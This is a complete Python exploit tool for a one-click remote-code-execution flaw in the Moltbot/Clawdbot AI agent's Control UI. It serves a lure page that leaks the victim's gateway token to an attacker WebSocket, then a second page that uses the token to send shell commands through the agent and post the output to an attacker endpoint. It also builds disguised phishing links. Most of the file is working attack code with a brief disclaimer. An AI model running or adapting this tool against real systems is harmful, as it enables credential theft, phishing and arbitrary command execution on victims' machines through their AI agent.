#!/usr/bin/env python3
"""
Moltbot/Clawdbot 1-Click RCE PoC - Simplified Version
======================================================
Based on: https://github.com/ethiack/moltbot-1click-rce
Advisory: GHSA-g8p2-7wf7-98mq

This is a SECURITY RESEARCH TOOL for educational purposes only.
Only use against systems you own or have explicit permission to test.

Vulnerability: The Control UI trusts gatewayUrl from query string without
validation and auto-connects on load, leaking the gateway token via WebSocket.

Requirements: pip install flask flask-sock requests
"""

import os
import sys
import json
import time
import base64
import hashlib
import hmac
import struct
import threading
import argparse
from datetime import datetime
from urllib.parse import quote, urljoin

try:
    from flask import Flask, request, jsonify, render_template_string
    from flask_sock import Sock
    import requests
except ImportError:
    print("\n[!] Missing dependencies. Install with:")
    print("    pip install flask flask-sock requests\n")
    sys.exit(1)


# ============================================================================
# Configuration
# ============================================================================

class Config:
    HOST = "0.0.0.0"
    PORT = 8888
    VICTIM_GATEWAY_HOST = "127.0.0.1"
    VICTIM_GATEWAY_PORT = 18789
    VICTIM_CONTROL_UI = "http://localhost:5173"
    EXFIL_FILE = "exfiltrated_data.json"


# Global state
captured_tokens = []
exfiltrated_data = []
app = Flask(__name__)
sock = Sock(app)


# ============================================================================
# Token Signature Utilities (TOTP-based authentication)
# ============================================================================

def generate_totp(secret: bytes, time_step: int = 30) -> str:
    """Generate TOTP code for gateway authentication."""
    counter = int(time.time()) // time_step
    counter_bytes = struct.pack(">Q", counter)
    hmac_hash = hmac.new(secret, counter_bytes, hashlib.sha256).digest()
    offset = hmac_hash[-1] & 0x0F
    code = struct.unpack(">I", hmac_hash[offset:offset + 4])[0] & 0x7FFFFFFF
    return str(code % 1000000).zfill(6)


def create_signed_message(token: str, message_type: str, payload: dict) -> dict:
    """Create a signed message for the gateway WebSocket API."""
    timestamp = int(time.time() * 1000)
    message = {
        "type": message_type,
        "timestamp": timestamp,
        "payload": payload
    }
    
    # Sign the message with the token
    message_str = json.dumps(message, separators=(',', ':'), sort_keys=True)
    signature = hmac.new(
        token.encode(),
        message_str.encode(),
        hashlib.sha256
    ).hexdigest()
    
    message["signature"] = signature
    return message


# ============================================================================
# HTML Templates
# ============================================================================

STAGE1_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Loading content...</p>
    </div>
    <script>
        // Stage 1: Open stage 2 in new window, then redirect to Control UI with malicious gatewayUrl
        const attackerServer = "{{ attacker_url }}";
        const controlUI = "{{ control_ui }}";
        const wsUrl = attackerServer.replace("http", "ws") + "/ws/capture";
        
        // Open stage 2 which will capture and use the token
        window.open(attackerServer + "/stage2", "_blank");
        
        // Redirect to Control UI with our malicious gatewayUrl
        // This triggers auto-connect and leaks the token
        setTimeout(() => {
            const maliciousUrl = controlUI + "?gatewayUrl=" + encodeURIComponent(wsUrl);
            window.location.href = maliciousUrl;
        }, 500);
    </script>
</body>
</html>
"""

STAGE2_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Moltbot PoC - Stage 2</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #1a1a2e;
            color: #0f0;
            padding: 20px;
            margin: 0;
        }
        .console {
            background: #0d0d1a;
            border: 1px solid #0f0;
            border-radius: 5px;
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
            min-height: 400px;
        }
        .header {
            color: #ff6b6b;
            margin-bottom: 20px;
            text-align: center;
        }
        #log {
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .success { color: #4ecdc4; }
        .error { color: #ff6b6b; }
        .info { color: #f9ca24; }
        .cmd { color: #a29bfe; }
        input {
            background: #0d0d1a;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 10px;
            width: calc(100% - 100px);
            font-family: inherit;
        }
        button {
            background: #0f0;
            color: #0d0d1a;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-family: inherit;
            font-weight: bold;
        }
        button:hover { background: #4ecdc4; }
        .input-row {
            margin-top: 20px;
            display: flex;
            gap: 10px;
        }
    </style>
</head>
<body>
    <div class="console">
        <div class="header">
            <h2>ğŸ¦ Moltbot 1-Click RCE PoC ğŸ¦</h2>
            <p>Waiting for token exfiltration...</p>
        </div>
        <div id="log"></div>
        <div class="input-row" id="cmdInput" style="display:none;">
            <input type="text" id="command" placeholder="Enter command to execute..." />
            <button onclick="executeCommand()">Execute</button>
        </div>
    </div>

    <script>
        const attackerServer = "{{ attacker_url }}";
        const victimGateway = "{{ victim_gateway }}";
        let capturedToken = null;
        let gatewayWs = null;

        function log(msg, cls = '') {
            const logEl = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            logEl.innerHTML += `<span class="${cls}">[${time}] ${msg}</span>\\n`;
            logEl.scrollTop = logEl.scrollHeight;
        }

        // Poll for captured token
        async function pollForToken() {
            log("Polling for captured token...", "info");
            
            for (let i = 0; i < 60; i++) {
                try {
                    const resp = await fetch(attackerServer + "/api/tokens");
                    const data = await resp.json();
                    
                    if (data.tokens && data.tokens.length > 0) {
                        capturedToken = data.tokens[data.tokens.length - 1];
                        log("TOKEN CAPTURED!", "success");
                        log(`Token: ${capturedToken.token.substring(0, 20)}...`, "success");
                        connectToVictimGateway();
                        return;
                    }
                } catch (e) {
                    // Continue polling
                }
                await new Promise(r => setTimeout(r, 1000));
            }
            log("Timeout waiting for token", "error");
        }

        // Connect to victim's gateway using captured token
        function connectToVictimGateway() {
            log(`Connecting to victim gateway: ${victimGateway}`, "info");
            
            gatewayWs = new WebSocket(victimGateway);
            
            gatewayWs.onopen = () => {
                log("Connected to victim gateway!", "success");
                
                // Send authentication message
                const authMsg = {
                    type: "auth",
                    token: capturedToken.token
                };
                gatewayWs.send(JSON.stringify(authMsg));
                log("Sent authentication...", "info");
            };
            
            gatewayWs.onmessage = (event) => {
                try {
                    const msg = JSON.parse(event.data);
                    log(`Gateway: ${JSON.stringify(msg)}`, "info");
                    
                    if (msg.type === "auth_success" || msg.authenticated) {
                        log("AUTHENTICATED TO VICTIM GATEWAY!", "success");
                        document.getElementById('cmdInput').style.display = 'flex';
                        log("Ready to execute commands. Enter command below:", "success");
                    }
                    
                    if (msg.type === "tool_result" || msg.result) {
                        log("Command output:", "cmd");
                        log(msg.result || msg.output || JSON.stringify(msg), "cmd");
                        
                        // Send result to attacker server
                        fetch(attackerServer + "/api/exfil", {
                            method: "POST",
                            headers: {"Content-Type": "application/json"},
                            body: JSON.stringify({type: "command_result", data: msg})
                        });
                    }
                } catch (e) {
                    log(`Raw message: ${event.data}`, "info");
                }
            };
            
            gatewayWs.onerror = (err) => {
                log(`WebSocket error: ${err}`, "error");
            };
            
            gatewayWs.onclose = () => {
                log("Connection to gateway closed", "error");
            };
        }

        // Execute command on victim's machine via Moltbot agent
        function executeCommand() {
            const cmd = document.getElementById('command').value;
            if (!cmd || !gatewayWs) return;
            
            log(`Executing: ${cmd}`, "cmd");
            
            // Send tool execution request to the agent
            const toolMsg = {
                type: "tool_call",
                tool: "shell",
                arguments: {
                    command: cmd
                },
                // Alternative format for different Moltbot versions
                message: {
                    role: "user", 
                    content: `Please run this shell command and show me the output: ${cmd}`
                }
            };
            
            gatewayWs.send(JSON.stringify(toolMsg));
            document.getElementById('command').value = '';
        }

        // Handle Enter key
        document.getElementById('command')?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') executeCommand();
        });

        // Start polling
        pollForToken();
    </script>
</body>
</html>
"""


# ============================================================================
# Flask Routes
# ============================================================================

@app.route("/")
def index():
    """Serve the Stage 1 exploit page."""
    attacker_url = f"http://{request.host}"
    return render_template_string(
        STAGE1_TEMPLATE,
        attacker_url=attacker_url,
        control_ui=Config.VICTIM_CONTROL_UI
    )


@app.route("/stage2")
def stage2():
    """Serve the Stage 2 page that captures token and executes commands."""
    attacker_url = f"http://{request.host}"
    victim_gateway = f"ws://{Config.VICTIM_GATEWAY_HOST}:{Config.VICTIM_GATEWAY_PORT}"
    return render_template_string(
        STAGE2_TEMPLATE,
        attacker_url=attacker_url,
        victim_gateway=victim_gateway
    )


@app.route("/api/tokens", methods=["GET"])
def get_tokens():
    """API endpoint to retrieve captured tokens."""
    return jsonify({"tokens": captured_tokens})


@app.route("/api/exfil", methods=["POST"])
def exfiltrate():
    """Receive exfiltrated data from the exploit."""
    data = request.get_json()
    data["timestamp"] = datetime.now().isoformat()
    exfiltrated_data.append(data)
    
    # Save to file
    with open(Config.EXFIL_FILE, "w") as f:
        json.dump(exfiltrated_data, f, indent=2)
    
    print(f"\n[+] Exfiltrated data received: {data.get('type', 'unknown')}")
    return jsonify({"status": "ok"})


@sock.route("/ws/capture")
def ws_capture(ws):
    """WebSocket endpoint that captures the leaked gateway token."""
    print("\n[+] New WebSocket connection for token capture!")
    
    while True:
        try:
            data = ws.receive(timeout=30)
            if data is None:
                break
            
            print(f"[+] Received WebSocket data: {data[:100]}...")
            
            # Try to parse and extract token
            try:
                msg = json.loads(data)
                token = None
                
                # Extract token from various message formats
                if isinstance(msg, dict):
                    token = msg.get("token") or msg.get("authToken") or \
                            msg.get("gatewayToken") or msg.get("payload", {}).get("token")
                
                if token:
                    token_entry = {
                        "token": token,
                        "timestamp": datetime.now().isoformat(),
                        "raw_message": msg
                    }
                    captured_tokens.append(token_entry)
                    print(f"\n[!!!] TOKEN CAPTURED: {token[:30]}...\n")
                    
                    # Send acknowledgment
                    ws.send(json.dumps({"type": "connected", "status": "ok"}))
            except json.JSONDecodeError:
                print(f"[*] Non-JSON data: {data[:50]}")
                
        except Exception as e:
            print(f"[*] WebSocket closed: {e}")
            break


# ============================================================================
# Interactive Menu
# ============================================================================

def print_banner():
    """Print the tool banner."""
    banner = """
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘       ğŸ¦ Moltbot/Clawdbot 1-Click RCE PoC Tool ğŸ¦              â•‘
â•‘                                                               â•‘
â•‘  CVE: GHSA-g8p2-7wf7-98mq                                     â•‘
â•‘  Based on: github.com/ethiack/moltbot-1click-rce              â•‘
â•‘                                                               â•‘
â•‘  âš ï¸  FOR AUTHORIZED SECURITY TESTING ONLY âš ï¸                   â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
"""
    print(banner)


def print_menu():
    """Print the interactive menu."""
    menu = """
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              MAIN MENU                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  1. Start Exploit Server                â”‚
â”‚  2. Configure Settings                  â”‚
â”‚  3. View Captured Tokens                â”‚
â”‚  4. View Exfiltrated Data               â”‚
â”‚  5. Generate Phishing Link              â”‚
â”‚  6. Direct Gateway Connect (with token) â”‚
â”‚  7. Show Vulnerability Info             â”‚
â”‚  0. Exit                                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
"""
    print(menu)


def configure_settings():
    """Configure exploit settings."""
    print("\n[*] Current Settings:")
    print(f"    Listen Host:        {Config.HOST}")
    print(f"    Listen Port:        {Config.PORT}")
    print(f"    Victim Gateway:     {Config.VICTIM_GATEWAY_HOST}:{Config.VICTIM_GATEWAY_PORT}")
    print(f"    Victim Control UI:  {Config.VICTIM_CONTROL_UI}")
    
    print("\n[*] Enter new values (press Enter to keep current):\n")
    
    host = input(f"Listen Host [{Config.HOST}]: ").strip()
    if host:
        Config.HOST = host
    
    port = input(f"Listen Port [{Config.PORT}]: ").strip()
    if port:
        Config.PORT = int(port)
    
    gateway_host = input(f"Victim Gateway Host [{Config.VICTIM_GATEWAY_HOST}]: ").strip()
    if gateway_host:
        Config.VICTIM_GATEWAY_HOST = gateway_host
    
    gateway_port = input(f"Victim Gateway Port [{Config.VICTIM_GATEWAY_PORT}]: ").strip()
    if gateway_port:
        Config.VICTIM_GATEWAY_PORT = int(gateway_port)
    
    control_ui = input(f"Victim Control UI [{Config.VICTIM_CONTROL_UI}]: ").strip()
    if control_ui:
        Config.VICTIM_CONTROL_UI = control_ui
    
    print("\n[+] Settings updated!")


def view_tokens():
    """Display captured tokens."""
    if not captured_tokens:
        print("\n[*] No tokens captured yet.\n")
        return
    
    print(f"\n[+] Captured Tokens ({len(captured_tokens)}):\n")
    for i, t in enumerate(captured_tokens, 1):
        print(f"  [{i}] Time: {t['timestamp']}")
        print(f"      Token: {t['token'][:50]}...")
        print()


def view_exfiltrated():
    """Display exfiltrated data."""
    if not exfiltrated_data:
        # Try to load from file
        if os.path.exists(Config.EXFIL_FILE):
            with open(Config.EXFIL_FILE) as f:
                data = json.load(f)
                if data:
                    print(f"\n[+] Exfiltrated Data ({len(data)} entries):\n")
                    print(json.dumps(data, indent=2))
                    return
        print("\n[*] No exfiltrated data yet.\n")
        return
    
    print(f"\n[+] Exfiltrated Data ({len(exfiltrated_data)} entries):\n")
    print(json.dumps(exfiltrated_data, indent=2))


def generate_link():
    """Generate a phishing link to send to victim."""
    print("\n[*] Generating phishing link...")
    
    external_ip = input("Enter your external IP/domain: ").strip()
    if not external_ip:
        external_ip = f"localhost:{Config.PORT}"
    
    if not external_ip.startswith("http"):
        external_ip = f"http://{external_ip}"
    
    if ":" not in external_ip.split("//")[1]:
        external_ip = f"{external_ip}:{Config.PORT}"
    
    phishing_url = external_ip
    
    print(f"""
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ PHISHING LINK READY                                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                 â”‚
â”‚ Direct link:                                                    â”‚
â”‚   {phishing_url}
â”‚                                                                 â”‚
â”‚ Disguised link (example):                                       â”‚
â”‚   {phishing_url}/?ref=moltbot-update-required
â”‚                                                                 â”‚
â”‚ Instructions:                                                   â”‚
â”‚   1. Make sure exploit server is running (Option 1)             â”‚
â”‚   2. Send link to victim who has Moltbot Control UI open        â”‚
â”‚   3. When they click, their token will be captured              â”‚
â”‚   4. Use Option 3 to view captured tokens                       â”‚
â”‚   5. Stage 2 will auto-connect and enable command execution     â”‚
â”‚                                                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
""")


def direct_connect():
    """Directly connect to a gateway with a known token."""
    print("\n[*] Direct Gateway Connection")
    
    token = input("Enter gateway token: ").strip()
    if not token:
        print("[!] Token required!")
        return
    
    gateway = input(f"Gateway URL [ws://{Config.VICTIM_GATEWAY_HOST}:{Config.VICTIM_GATEWAY_PORT}]: ").strip()
    if not gateway:
        gateway = f"ws://{Config.VICTIM_GATEWAY_HOST}:{Config.VICTIM_GATEWAY_PORT}"
    
    print(f"\n[*] Connecting to {gateway}...")
    print("[*] This feature requires running in browser context.")
    print("[*] Use the Stage 2 page with a captured token instead.")
    print(f"\n[*] Or use wscat/websocat:")
    print(f'    wscat -c "{gateway}"')
    print(f'    Then send: {{"type":"auth","token":"{token[:20]}..."}}')


def show_vuln_info():
    """Display vulnerability information."""
    info = """
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ VULNERABILITY DETAILS                                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                 â”‚
â”‚ Advisory:    GHSA-g8p2-7wf7-98mq                                â”‚
â”‚ CVSS Score:  8.8 (High)                                         â”‚
â”‚ Affected:    Moltbot/Clawdbot <= v2026.1.28                     â”‚
â”‚ Patched:     v2026.1.29                                         â”‚
â”‚                                                                 â”‚
â”‚ SUMMARY:                                                        â”‚
â”‚ The Control UI trusts 'gatewayUrl' from query parameters        â”‚
â”‚ without validation and auto-connects on page load, sending      â”‚
â”‚ the stored gateway token in the WebSocket connect payload.      â”‚
â”‚                                                                 â”‚
â”‚ IMPACT:                                                         â”‚
â”‚ - Token exfiltration leading to full gateway compromise         â”‚
â”‚ - Works even on localhost-only instances (browser is bridge)    â”‚
â”‚ - Attacker gains operator-level access to gateway API           â”‚
â”‚ - Enables arbitrary config changes and code execution           â”‚
â”‚                                                                 â”‚
â”‚ ATTACK FLOW:                                                    â”‚
â”‚ 1. Victim clicks malicious link                                 â”‚
â”‚ 2. Link redirects to Control UI with attacker's gatewayUrl      â”‚
â”‚ 3. Control UI auto-connects and leaks token to attacker         â”‚
â”‚ 4. Attacker uses token to connect to victim's gateway           â”‚
â”‚ 5. Attacker executes commands via Moltbot agent (RCE)           â”‚
â”‚                                                                 â”‚
â”‚ WHY IT WORKS ON LOCALHOST:                                      â”‚
â”‚ - WebSockets have no CORS restrictions                          â”‚
â”‚ - Victim's browser acts as the bridge to localhost              â”‚
â”‚ - Chrome's Local Network Access is not enabled by default       â”‚
â”‚                                                                 â”‚
â”‚ REFERENCES:                                                     â”‚
â”‚ - https://ethiack.com/news/blog/one-click-rce-moltbot           â”‚
â”‚ - https://github.com/ethiack/moltbot-1click-rce                 â”‚
â”‚                                                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
"""
    print(info)


def start_server():
    """Start the exploit server."""
    print(f"\n[+] Starting exploit server on {Config.HOST}:{Config.PORT}")
    print(f"[+] Victim Gateway Target: {Config.VICTIM_GATEWAY_HOST}:{Config.VICTIM_GATEWAY_PORT}")
    print(f"[+] Victim Control UI: {Config.VICTIM_CONTROL_UI}")
    print("\n[*] Endpoints:")
    print(f"    - Stage 1 (send to victim): http://{Config.HOST}:{Config.PORT}/")
    print(f"    - Stage 2 (auto-opened):    http://{Config.HOST}:{Config.PORT}/stage2")
    print(f"    - Token Capture WS:         ws://{Config.HOST}:{Config.PORT}/ws/capture")
    print(f"    - API - Get Tokens:         http://{Config.HOST}:{Config.PORT}/api/tokens")
    print("\n[*] Press Ctrl+C to stop the server\n")
    
    # Suppress Flask's default logging for cleaner output
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    
    try:
        app.run(host=Config.HOST, port=Config.PORT, debug=False)
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")


def main():
    """Main function with interactive menu."""
    print_banner()
    
    # Check for command-line arguments
    parser = argparse.ArgumentParser(description="Moltbot 1-Click RCE PoC")
    parser.add_argument("--serve", action="store_true", help="Start server immediately")
    parser.add_argument("--port", type=int, help="Server port")
    parser.add_argument("--host", type=str, help="Server host")
    args = parser.parse_args()
    
    if args.port:
        Config.PORT = args.port
    if args.host:
        Config.HOST = args.host
    
    if args.serve:
        start_server()
        return
    
    # Interactive menu loop
    while True:
        print_menu()
        
        try:
            choice = input("Select option: ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n\n[*] Goodbye!")
            break
        
        if choice == "1":
            start_server()
        elif choice == "2":
            configure_settings()
        elif choice == "3":
            view_tokens()
        elif choice == "4":
            view_exfiltrated()
        elif choice == "5":
            generate_link()
        elif choice == "6":
            direct_connect()
        elif choice == "7":
            show_vuln_info()
        elif choice == "0":
            print("\n[*] Goodbye!")
            break
        else:
            print("\n[!] Invalid option. Try again.\n")


if __name__ == "__main__":
    main()
